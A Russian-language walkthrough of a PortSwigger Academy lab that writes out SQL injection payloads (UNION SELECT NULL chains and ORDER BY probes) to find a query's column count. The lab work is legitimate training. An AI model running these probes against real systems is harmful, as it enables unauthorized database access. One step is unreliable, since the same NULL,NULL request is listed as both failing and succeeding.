При переходе в раздел `Gifts` мы можем видеть количество товаров, доступных нам, как обычному пользователю
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/3.%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/pics%20for%20walktrough/1.png)

Для определения количества столбцов можно воспользоваться следующей логикой
```
' UNION SELECT NULL--
```
И добавляя дополнительные NULL'ы, мы можем вычислить количество столбцов в таблице
Посмотрим сколько же столбцов содержится в таблице, для этого воспользуемся методом перебора
Соответсвенно, в URL-кодировке, запрос будет выглядеть как
```
GET /filter?category=gifts'+UNION+SELECT+NULL--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/3.%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/pics%20for%20walktrough/2.png)
Встречаем 500 ошибку. Это хорошо, значит мы просто не угадали с количеством столбцов. Методом перебора пробуем 
```
GET /filter?category=gifts'+UNION+SELECT+NULL,NULL--
```
Что тоже сулит нам неудачу

а вот 
```
GET /filter?category=gifts'+UNION+SELECT+NULL,NULL--
```
Приведет нас к успеху, и вернет 200 статус код


Аналогично с методом `' UNION SELECT NULL--` можно использовать метод `' ORDER BY`
Но если использование `' UNION SELECT NULL--` равнозначно `равенству (==)` столбцов, то метод ' ORDER BY будет равносилен `<=` столбцов
```
GET /filter?category=gifts'+order+by+1--
```
```
GET /filter?category=gifts'+order+by+2--
```
```
GET /filter?category=gifts'+order+by+3--
```
будет отдавать 200 статус код
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/3.%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/pics%20for%20walktrough/3.png)

А вот большие числа, отдадут 500 статус код
```
GET /filter?category=gifts'+order+by+4--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/3.%20SQL%20injection%20UNION%20attack%2C%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query/pics%20for%20walktrough/4.png)
